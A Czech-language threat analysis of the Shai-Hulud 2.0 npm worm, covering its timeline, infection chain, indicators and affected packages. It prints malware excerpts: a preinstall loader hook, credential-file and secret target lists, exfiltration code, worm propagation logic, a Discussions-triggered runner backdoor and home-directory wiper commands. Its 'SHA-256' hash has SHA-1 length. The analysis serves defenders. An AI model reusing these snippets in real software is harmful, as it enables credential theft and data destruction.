# 🎯 Threat Overview: Shai-Hulud 2.0

> Kompletní technická analýza npm supply-chain wormu

## Timeline

| Datum | Událost |
|-------|---------|
| 2025-09-15 | Shai-Hulud v1 – první vlna, 180+ packages |
| 2025-09-23 | CISA vydává alert |
| 2025-11-21 | Shai-Hulud 2.0 – upload prvních malicious packages |
| 2025-11-24 01:22 UTC | První exfiltration repos na GitHub |
| 2025-11-24 03:00 UTC | Masivní šíření na npm |
| 2025-11-25 22:45 UTC | Druhá fáze: "The Continued Coming" |
| 2025-11-26 | GitHub začíná revoking, ~300 public repos |
| 2025-12-09 | npm plánuje deprecation classic tokens |

## Anatomie útoku

### 1. Initial Access

Útočník získá přístup k npm účtu maintainera jedním z těchto způsobů:

- **Phishing** – falešné emaily od npm o "MFA update"
- **Credential stuffing** – použití uniklých hesel z jiných breaches
- **Kompromitace CI/CD** – krádež tokenů z GitHub Actions
- **Social engineering** – přímý kontakt s maintainerem

### 2. Infection Vector

```
Compromised package → npm publish → Developer runs npm install → Payload executes
```

**Klíčová změna v 2.0:** Payload se spouští v `preinstall` fázi:

```json
{
  "scripts": {
    "preinstall": "node setup_bun.js"
  }
}
```

To znamená, že kód běží **PŘED** instalací závislostí a **PŘED** jakýmkoliv statickým skenováním.

### 3. Payload Structure

```
package/
├── package.json          # Modified s preinstall script
├── setup_bun.js          # Loader (stage 1)
└── bun_environment.js    # Main payload (stage 2, obfuscated)
```

**setup_bun.js** (Loader):
1. Detekuje OS (Linux/macOS/Windows)
2. Stáhne a nainstaluje Bun runtime (pokud chybí)
3. Spustí `bun_environment.js` jako detached proces

**bun_environment.js** (Main payload):
- ~500KB obfuskovaný JavaScript
- Bundlován se všemi dependencies
- Používá triple base64 encoding pro exfiltraci

### 4. Credential Harvesting

Malware aktivně hledá credentials na těchto místech:

#### Lokální soubory

| Cesta | Typ |
|-------|-----|
| `~/.npmrc` | npm token |
| `~/.bun/credentials` | bun credentials |
| `~/.gitconfig` | Git credentials |
| `~/.ssh/*` | SSH keys |
| `~/.aws/credentials` | AWS credentials |
| `~/.aws/config` | AWS config |
| `~/.azure/` | Azure credentials |
| `~/.config/gcloud/application_default_credentials.json` | GCP credentials |
| `~/.docker/config.json` | Docker registry tokens |
| `~/.kube/config` | Kubernetes credentials |

#### Environment Variables

```javascript
// Targetované env vars
const targets = [
  'NPM_TOKEN', 'NODE_AUTH_TOKEN',
  'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
  'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
  'GOOGLE_APPLICATION_CREDENTIALS', 'GCLOUD_SERVICE_KEY',
  'DOCKER_USERNAME', 'DOCKER_PASSWORD',
  'SLACK_TOKEN', 'SLACK_WEBHOOK',
  'DATADOG_API_KEY', 'DD_API_KEY'
];
```

#### GitHub Actions Secrets

Malware enumeruje všechny repozitáře uživatele a extrahuje:
- Repository secrets
- Environment secrets
- Organization secrets (pokud má přístup)

#### Cloud Metadata Services

```javascript
// IMDS endpoints
const imds = {
  aws: 'http://169.254.169.254/latest/meta-data/',
  gcp: 'http://metadata.google.internal/computeMetadata/v1/',
  azure: 'http://169.254.169.254/metadata/instance'
};
```

#### TruffleHog Integration

Malware stahuje legitimní TruffleHog binary a používá ho k aktivnímu vyhledávání secrets v souborovém systému.

### 5. Exfiltration

#### Primární metoda: GitHub Repos

```javascript
// Vytvoření exfiltration repo
const repoName = generateRandomName(); // 18 random chars
const description = "Sha1-Hulud: The Second Coming.";

// Soubory v repo
const files = [
  'cloud.json',        // Cloud credentials (AWS/GCP/Azure)
  'contents.json',     // Lokální soubory s credentials
  'environment.json',  // Environment variables
  'truffleSecrets.json', // TruffleHog findings
  'actionsSecrets.json'  // GitHub Actions secrets
];

// Data jsou triple base64 encoded
const encoded = btoa(btoa(btoa(JSON.stringify(data))));
```

#### Fallback metoda: Cross-victim exfiltration

Pokud nemá GitHub credentials, použije credentials ukradené od jiné oběti k vytvoření exfiltration repo pod jejich účtem.

### 6. Self-Propagation

```javascript
// Worm propagation logic
async function propagate(npmToken) {
  const packages = await getUserPackages(npmToken);
  const targetCount = Math.min(packages.length, 100); // Max 100 packages
  
  for (const pkg of packages.slice(0, targetCount)) {
    await injectPayload(pkg);
    await publishMaliciousVersion(pkg, npmToken);
  }
}
```

### 7. Persistence

#### GitHub Discussions Backdoor

Malware vytváří workflow soubor `.github/workflows/discussion.yaml`:

```yaml
name: Discussion Create
on:
  discussion:
jobs:
  process:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo ${{ github.event.discussion.body }}
```

To registruje infikovaný stroj jako self-hosted runner a umožňuje vzdálené spouštění příkazů přes GitHub Discussions.

### 8. Destructive Fallback (Dead-man switch)

Pokud se nepodaří exfiltrovat data nebo najít tokens:

```javascript
// Unix wiper
if (platform !== 'win32') {
  execSync('rm -rf ~/*');
  execSync('find ~ -type d -empty -delete');
}

// Windows wiper
if (platform === 'win32') {
  execSync('rd /s /q %USERPROFILE%');
}
```

## Technické IOC

### File Hashes (SHA-256)

```
setup_bun.js:     d60ec97eea19fffb4809bc35b91033b52490ca11
bun_environment.js: [varies per version]
```

### Network Indicators

- `api.github.com` – pro exfiltraci a propagaci
- `registry.npmjs.org` – pro publikování malicious packages
- `github.com/repos/*/releases` – stahování TruffleHog
- Cloud IMDS endpoints

### Behavioral Indicators

1. Neočekávaná instalace Bun runtime
2. `bun` nebo `bun_environment` procesy
3. Přístup k `~/.npmrc`, `~/.aws/`, `~/.azure/`
4. GitHub API calls z neočekávaných procesů
5. Vytváření `.truffler-cache` adresáře
6. Nové workflow soubory v `.github/workflows/`

## Zasažené ekosystémy

### Primární: npm

- 796+ unique packages
- 1092+ malicious versions
- 20+ milionů weekly downloads

### Sekundární: Maven Central

Přes `org.mvnpm` automatickou konverzi npm→Maven byly zasaženy i Java projekty.

### Známé prominentní oběti

| Projekt | Packages |
|---------|----------|
| **Zapier** | zapier-platform-core, zapier-platform-cli, zapier-sdk |
| **ENS Domains** | @ensdomains/ensjs, @ensdomains/content-hash |
| **PostHog** | posthog-node, posthog-js, @posthog/agent |
| **Postman** | @postman/tunnel-agent, @postman/postman-mcp-cli |
| **AsyncAPI** | @asyncapi/specs, @asyncapi/openapi-schema-parser |

## Atribuce

- Možná odlišný threat actor než Shai-Hulud v1
- Rozdíly v payload struktuře a TTPs
- Použití stejné naming convention
- Unit 42 odhaduje s moderate confidence použití LLM pro generování kódu

## Reference

- [Palo Alto Unit 42 Analysis](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/)
- [Wiz Research](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [Socket.dev Blog](https://socket.dev/blog/shai-hulud-strikes-again-v2)
- [SafeDep Incident Report](https://safedep.io/shai-hulud-second-coming-supply-chain-attack/)
